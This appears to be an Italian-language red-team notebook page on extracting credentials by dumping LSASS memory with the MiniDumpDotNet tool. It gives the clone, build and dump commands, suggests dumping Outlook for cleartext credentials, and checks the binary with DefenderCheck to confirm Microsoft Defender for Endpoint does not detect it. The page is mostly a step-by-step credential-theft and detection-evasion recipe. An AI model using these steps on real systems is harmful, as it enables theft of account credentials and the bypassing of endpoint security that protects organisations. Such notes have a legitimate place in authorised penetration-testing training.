# MDE - Credential Extraction - LSASS Dump 2

*   MiniDumpDotNet è uno strumento che permette di estrarre dump del processo LSASS utilizzando tecniche di iniezione CLR (.NET).

    **Caratteristiche principali:**

    * Supporta il runtime .NET (CLR) per massima flessibilità di esecuzione
    * Può essere utilizzato in diversi modi:
      * Come eseguibile standalone
      * Tramite Assembly.Load()
      * Attraverso PowerShell
      * Via JScript/VBScript
* Questo tool puo' essere utilizzato per fare dump di qualsiasi processo, come per esempio il processo Outlook che puo' esporre credenziali in chiaro
* Per scaricare il processo LSASS con minidumpdotnet usare la seguente sintassi, notare che abbiamo bisogno del Process ID del LSASS Process

```powershell
.\minidumpdotnet.exe <LSASS PID> <minidump file>
```

* Download progetto

```powershell
git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git
```

#### _Nota: questo progetto è stato implementato con Visual Studio 2015, ma dovrebbe essere supportato da qualsiasi compilatore Visual Studio_ _in grado di compilare codice VS C++ CLR._

* Buildando la soluzione verranno generati sia l'eseguibile sia le classi .NET : _Build-->Build Solution_
* Eseguire dei check per rilevazione con DefenderCheck

```powershell
C:\AD\Tools\DefenderCheck> .\DefenderCheck.exe C:\AD\Tools\minidumpdotnet.exe
[+] No threat found in submitted file!
```

* Nessun rilevamento lato MDE

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
